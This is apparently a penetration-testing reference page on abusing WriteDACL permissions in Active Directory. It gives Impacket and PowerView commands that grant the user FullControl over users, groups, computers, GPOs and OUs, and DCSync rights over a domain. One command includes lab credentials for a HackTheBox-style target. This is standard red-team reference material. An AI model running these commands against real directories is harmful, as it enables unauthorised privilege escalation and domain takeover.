# WriteDACL

## Information

With `Write` access to the target objectâ€™s DACL, you can **grant yourself any privilege you want on the object**.

{% tabs %}
{% tab title="Users" %}
Grant yourself `FullControl` of the user:

{% code overflow="wrap" %}
```bash
# Assigning FullControl permissions over the user with Impacket
impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```
{% endcode %}

```powershell
# Assigning GenericAll permissions over the user with PowerView
Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All
```

See [here](fullcontrol.md) for exploitation options.
{% endtab %}

{% tab title="Groups" %}
Grant yourself `FullControl` of the group:

```powershell
# Powerview
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
```

&#x20;This can be leverage to add members to the group (see [here](genericall.md#over-a-group)).
{% endtab %}

{% tab title="Hosts" %}
Grant yourself `FullControl` of the computer:

```powershell
# Assigning GenericAll permissions over the computer
Add-DomainObjectAcl -TargetIdentity windows01 -Rights All
```

This can be leveraged to [read the LAPS password](readlapspassword.md) or perform [RBCD](broken-reference) against the target host.
{% endtab %}

{% tab title="Domains" %}
Grant yourself `DCSync` rights:

```powershell
Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
```

This can be leveraged to perform a [DCSync attack](dcsync.md).
{% endtab %}

{% tab title="GPOs" %}
Grant yourself `FullControl` of the GPO:

```powershell
Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All
```

This can be leveraged to edit the GPO and take over an object the GPO applies to.
{% endtab %}

{% tab title="OUs" %}
Grant yourself `FullControl` of the OU:

```powershell
Add-DomainObjectAcl -TargetIdentity <OU-GUID> -Rights All
```

This can be leveraged to add a new ACE to the OU that inherits down to child objects so we can then take over those child objects.
{% endtab %}
{% endtabs %}
